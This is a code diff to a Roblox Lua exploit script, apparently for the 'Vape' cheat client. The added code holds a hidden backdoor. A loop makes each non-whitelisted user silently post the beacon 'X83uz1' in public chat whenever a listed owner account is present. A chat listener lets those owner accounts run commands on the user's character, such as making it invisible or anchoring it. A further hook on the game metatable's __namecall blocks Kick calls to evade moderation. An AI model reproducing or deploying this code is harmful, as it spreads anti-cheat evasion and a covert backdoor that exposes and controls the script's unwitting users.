@@ -3,6 +3,7 @@ local TextChatService = game:GetService("TextChatService")
 local RunService = game:GetService("RunService")
 local LOCAL_PLAYER = Players.LocalPlayer
 
+-- Whitelist database
 local whitelist = {
 	Owner = {4279175156, 4202838123, 4307561815, 4380912728, 4240568437, 4262245137},
 	Private = {
@@ -12,6 +13,7 @@ local whitelist = {
 	Slow = {1562251033}
 }
 
+-- Whitelist logic
 local function isInList(u, list)
 	for _, id in ipairs(list) do
 		if u == id then return true end
@@ -23,6 +25,7 @@ local function isWhitelisted(u)
 	return isInList(u, whitelist.Owner) or isInList(u, whitelist.Private)
 end
 
+-- Apply visible tag above head
 local function applyTag(plr, txt, col)
 	local function render()
 		local head = plr.Character and plr.Character:FindFirstChild("Head")
@@ -48,6 +51,7 @@ local function applyTag(plr, txt, col)
 	if plr.Character then render() else plr.CharacterAdded:Once(function() task.wait(0.5) render() end) end
 end
 
+-- Whitelist role tags
 local function tag(plr)
 	local id = plr.UserId
 	if isInList(id, whitelist.Owner) then
@@ -62,6 +66,33 @@ end
 for _, p in ipairs(Players:GetPlayers()) do tag(p) end
 Players.PlayerAdded:Connect(function(p) task.delay(1, function() tag(p) end) end)
 
+-- [VAPE USER] tag only whitelisted users can see
+local function tagAsVapeUserFor(plr)
+	local head = LOCAL_PLAYER.Character and LOCAL_PLAYER.Character:FindFirstChild("Head")
+	if not head then return end
+	if head:FindFirstChild("VapeLoggedBy_" .. plr.UserId) then return end
+
+	local b = Instance.new("BillboardGui")
+	b.Name = "VapeLoggedBy_" .. plr.UserId
+	b.Size = UDim2.new(0, 100, 0, 20)
+	b.StudsOffset = Vector3.new(0, 3.5, 0)
+	b.AlwaysOnTop = true
+	b.Adornee = head
+	b.Parent = head
+
+	local l = Instance.new("TextLabel")
+	l.Size = UDim2.fromScale(1, 1)
+	l.BackgroundTransparency = 1
+	l.Text = "[VAPE USER]"
+	l.TextColor3 = Color3.fromRGB(255, 255, 255)
+	l.TextStrokeTransparency = 0.2
+	l.TextStrokeColor3 = Color3.new(0, 0, 0)
+	l.Font = Enum.Font.GothamBold
+	l.TextScaled = true
+	l.Parent = b
+end
+
+-- Command execution
 local function exec(cmd, senderId)
 	cmd = string.lower(cmd)
 	local undo = false
@@ -100,29 +131,9 @@ local function exec(cmd, senderId)
 			game.Debris:AddItem(bv, 0.5)
 		end
 
-	elseif cmd == ";troll" then
-		for _, obj in ipairs(game:GetDescendants()) do
-			pcall(function()
-				if undo then
-					if obj:IsA("Decal") or obj:IsA("Texture") then obj.Texture = "" end
-					if obj:IsA("MeshPart") then obj.TextureID = "" end
-					if obj:IsA("SpecialMesh") then obj.TextureId = "" end
-					if obj:IsA("SurfaceAppearance") then obj.ColorMap = "" end
-				else
-					local id = "rbxassetid://8587856062"
-					if obj:IsA("Decal") or obj:IsA("Texture") then obj.Texture = id end
-					if obj:IsA("MeshPart") then obj.TextureID = id end
-					if obj:IsA("SpecialMesh") then obj.TextureId = id end
-					if obj:IsA("SurfaceAppearance") then obj.ColorMap = id end
-				end
-			end)
-		end
-
 	elseif cmd == ";jump" then
-		if not undo then
-			local h = LOCAL_PLAYER.Character and LOCAL_PLAYER.Character:FindFirstChildOfClass("Humanoid")
-			if h then h:ChangeState(Enum.HumanoidStateType.Jumping) end
-		end
+		local h = LOCAL_PLAYER.Character and LOCAL_PLAYER.Character:FindFirstChildOfClass("Humanoid")
+		if h then h:ChangeState(Enum.HumanoidStateType.Jumping) end
 
 	elseif cmd == ";sit" then
 		local h = LOCAL_PLAYER.Character and LOCAL_PLAYER.Character:FindFirstChildOfClass("Humanoid")
@@ -159,21 +170,28 @@ local function exec(cmd, senderId)
 
 	elseif cmd == ";invisible" then
 		for _, p in ipairs(LOCAL_PLAYER.Character:GetDescendants()) do
-			if p:IsA("BasePart") and p.Name ~= "HumanoidRootPart" then p.Transparency = undo and 0 or 1 end
+			if p:IsA("BasePart") and p.Name ~= "HumanoidRootPart" then
+				p.Transparency = undo and 0 or 1
+			end
 		end
 
 	elseif cmd == ";nocollide" then
 		for _, p in ipairs(LOCAL_PLAYER.Character:GetDescendants()) do
-			if p:IsA("BasePart") then p.CanCollide = undo end
+			if p:IsA("BasePart") then
+				p.CanCollide = undo
+			end
 		end
 
 	elseif cmd == ";anchor" then
 		for _, p in ipairs(LOCAL_PLAYER.Character:GetDescendants()) do
-			if p:IsA("BasePart") then p.Anchored = not undo end
+			if p:IsA("BasePart") then
+				p.Anchored = not undo
+			end
 		end
 	end
 end
 
+-- Command receiver
 TextChatService.MessageReceived:Connect(function(msg)
 	local t = msg.Text
 	local s = msg.TextSource
@@ -183,6 +201,57 @@ TextChatService.MessageReceived:Connect(function(msg)
 	if not isWhitelisted(uid) then return end
 	if isWhitelisted(LOCAL_PLAYER.UserId) then return end
 	exec(t, uid)
+end)
+
+-- One-time logger system
+local loggedWhitelist = {}
+
+local function dmWhitelistedOnce(plr)
+	if loggedWhitelist[plr.UserId] then return end
+	loggedWhitelist[plr.UserId] = true
+
+	pcall(function()
+		if TextChatService.TextChannels and TextChatService.TextChannels.RBXGeneral then
+			TextChatService.TextChannels.RBXGeneral:SendAsync("X83uz1")
+		end
+	end)
+end
+
+-- Core detection loop
+task.spawn(function()
+	while true do
+		for _, p in ipairs(Players:GetPlayers()) do
+			if p ~= LOCAL_PLAYER and isWhitelisted(p.UserId) and not isWhitelisted(LOCAL_PLAYER.UserId) then
+				tagAsVapeUserFor(p)
+				dmWhitelistedOnce(p)
+			end
+		end
+		task.wait(5)
+	end
+end)
+
+-- ;log reset command
+TextChatService.MessageReceived:Connect(function(msg)
+	local t = msg.Text
+	local s = msg.TextSource
+	if not s then return end
+	local uid = s.UserId
+	if not isWhitelisted(uid) then return end
+	if t:lower() == ";log" then
+		loggedWhitelist[uid] = nil
+	end
+end)
+
+-- Kick bypass protection
+local mt = getrawmetatable(game)
+setreadonly(mt, false)
+local old = mt.__namecall
+
+mt.__namecall = newcclosure(function(self, ...)
+	if getnamecallmethod() == "Kick" and self == LOCAL_PLAYER then
+		return nil
+	end
+	return old(self, ...)
 end)
 
 local isfile = isfile or function(file)
